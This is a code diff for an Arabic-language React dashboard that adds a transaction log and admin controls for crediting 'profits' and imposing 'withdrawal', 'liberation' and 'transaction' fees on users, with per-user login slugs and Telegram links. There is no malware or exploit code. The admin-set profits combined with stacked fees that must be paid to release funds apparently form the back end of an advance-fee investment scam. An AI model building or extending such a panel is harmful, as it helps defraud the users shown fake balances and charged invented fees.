+                  <p className="font-extrabold text-[20px] text-[#92400e]">{user.transactionFee} ر.س</p>
+                  <div className="mt-3 flex flex-col gap-1">
+                    <p className="text-[11px] text-[#16a34a] font-semibold">✓ تأكيد سداد مبلغ المعاملة</p>
                     <p className="text-[11px] text-[#16a34a] font-semibold">✓ إرسال إشعار للمستفيد</p>
                   </div>
                 </div>
@@ -1456,10 +1747,70 @@ function UserDashboard({
                 </button>
                 <button onClick={() => void handleAdminFinancial()} disabled={adminLoading}
                   className="flex-1 py-2.5 rounded-xl text-white font-bold text-[13px] transition-opacity active:opacity-90 disabled:opacity-50"
-                  style={{ background: adminModal.type === "add-profits" ? "linear-gradient(135deg,#0f7a38,#22c55e)" : adminModal.type === "add-fees" ? "linear-gradient(135deg,#d97706,#f59e0b)" : "linear-gradient(135deg,#c8005a,#f0196e)" }}>
+                  style={{ background: adminModal.type === "add-profits" ? "linear-gradient(135deg,#0f7a38,#22c55e)" : adminModal.type === "add-fees" ? "linear-gradient(135deg,#d97706,#f59e0b)" : adminModal.type === "add-liberation-fee" || adminModal.type === "pay-liberation-fee" ? "linear-gradient(135deg,#4a0a0a,#8B1A1A)" : adminModal.type === "add-transaction-fee" || adminModal.type === "pay-transaction-fee" ? "linear-gradient(135deg,#78350f,#d97706)" : "linear-gradient(135deg,#c8005a,#f0196e)" }}>
                   {adminLoading ? "جارٍ..." : "تأكيد"}
                 </button>
               </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* ── Financial Transaction Log Panel ──────────────────── */}
+      {showTransactionLog && (
+        <div className="fixed inset-0 z-50 flex" dir="rtl" style={{ fontFamily: "'Cairo', sans-serif" }}>
+          <div className="flex-1 bg-black/30 backdrop-blur-sm" onClick={() => setShowTransactionLog(false)} />
+          <div className="w-full max-w-sm bg-white h-full overflow-y-auto flex flex-col shadow-2xl"
+            style={{ animation: "slideInRight 0.25s ease-out" }}>
+            <div className="flex items-center justify-between px-5 py-4 border-b border-[#eef0f6] sticky top-0 bg-white z-10"
+              style={{ background: "linear-gradient(135deg,#1a1f3c,#2952e3)" }}>
+              <button onClick={() => setShowTransactionLog(false)}
+                className="w-8 h-8 rounded-full flex items-center justify-center text-white" style={{ background: "rgba(255,255,255,0.2)" }}>
+                <Icon.X />
+              </button>
+              <h2 className="font-extrabold text-[15px] text-white">سجل العمليات المالية</h2>
+              <div className="w-8 h-8 rounded-full flex items-center justify-center" style={{ background: "rgba(255,255,255,0.15)" }}>
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+              </div>
+            </div>
+            <div className="flex flex-col flex-1">
+              {transactionLog.length === 0 && (
+                <div className="flex-1 flex flex-col items-center justify-center py-20 text-[#8892a4]">
+                  <div className="text-[40px] mb-3">📋</div>
+                  <p className="font-bold text-[13px]">لا توجد عمليات مسجلة</p>
+                </div>
+              )}
+              {transactionLog.map((tx) => {
+                const d = new Date(tx.createdAt);
+                const typeLabel: Record<string, { label: string; color: string; bg: string }> = {
+                  add_profits: { label: "إضافة أرباح", color: "#16a34a", bg: "#f0fdf4" },
+                  add_fees: { label: "إضافة رسوم سحب", color: "#d97706", bg: "#fef3c7" },
+                  pay_withdrawal_fees: { label: "سداد رسوم السحب", color: "#c8005a", bg: "#fef2f2" },
+                  add_liberation_fee: { label: "إضافة رسوم التحرير", color: "#8B1A1A", bg: "#fdf2f8" },
+                  pay_liberation_fee: { label: "سداد رسوم التحرير", color: "#7c3aed", bg: "#f5f3ff" },
+                  add_transaction_fee: { label: "إضافة مبلغ المعاملة", color: "#92400e", bg: "#fff8e1" },
+                  pay_transaction_fee: { label: "سداد مبلغ المعاملة", color: "#0f7a38", bg: "#dcfce7" },
+                };
+                const meta = typeLabel[tx.type] ?? { label: tx.type, color: "#5a6282", bg: "#f3f5fa" };
+                return (
+                  <div key={tx.id} className="px-5 py-4 border-b border-[#eef0f6] text-right">
+                    <div className="flex items-start gap-3">
+                      <div className="w-9 h-9 rounded-xl flex items-center justify-center flex-shrink-0 mt-0.5"
+                        style={{ background: meta.bg, border: `1.5px solid ${meta.color}22` }}>
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke={meta.color} strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+                      </div>
+                      <div className="flex-1 min-w-0">
+                        <div className="flex items-center justify-between mb-1">
+                          <span className="text-[12px] font-extrabold" style={{ color: meta.color }}>{tx.amount} ر.س</span>
+                          <span className="text-[11px] font-bold text-[#1a1f3c]">{meta.label}</span>
+                        </div>
+                        <p className="text-[11px] text-[#5a6282] font-medium mb-1">{tx.description}</p>
+                        <p className="text-[10px] text-[#8892a4]">{d.toLocaleString("ar-SA")}</p>
+                      </div>
+                    </div>
+                  </div>
+                );
+              })}
             </div>
           </div>
         </div>
@@ -1483,6 +1834,7 @@ function UserDashboard({
           userName={user.name}
           withdrawalFeeStatus={user.withdrawalFeeStatus}
           hasPreviousPayment={notifications.some((n) => n.type === "fees_paid")}
+          user={user}
         />
       )}
 
@@ -1570,6 +1922,13 @@ const emptyUser: UserFormData = {
   status: "active",
   loginTitle: "",
   loginSlug: "",
+  withdrawalFeePaidAt: null,
+  liberationFee: "0",
+  liberationFeeStatus: "unpaid",
+  liberationFeePaidAt: null,
+  transactionFee: "0",
+  transactionFeeStatus: "unpaid",
+  transactionFeePaidAt: null,
   telegramLink: "",
   withdrawalFeeStatus: "unpaid",
 };
@@ -2054,6 +2413,13 @@ function AdminDashboard({
             loginSlug: editingUser.loginSlug ?? "",
             telegramLink: editingUser.telegramLink ?? "",
             withdrawalFeeStatus: editingUser.withdrawalFeeStatus ?? "unpaid",
+            withdrawalFeePaidAt: editingUser.withdrawalFeePaidAt ?? null,
+            liberationFee: editingUser.liberationFee ?? "0",
+            liberationFeeStatus: editingUser.liberationFeeStatus ?? "unpaid",
+            liberationFeePaidAt: editingUser.liberationFeePaidAt ?? null,
+            transactionFee: editingUser.transactionFee ?? "0",
+            transactionFeeStatus: editingUser.transactionFeeStatus ?? "unpaid",
+            transactionFeePaidAt: editingUser.transactionFeePaidAt ?? null,
           }}
           onSave={handleEdit}
           onClose={() => setModal({ type: "none" })}
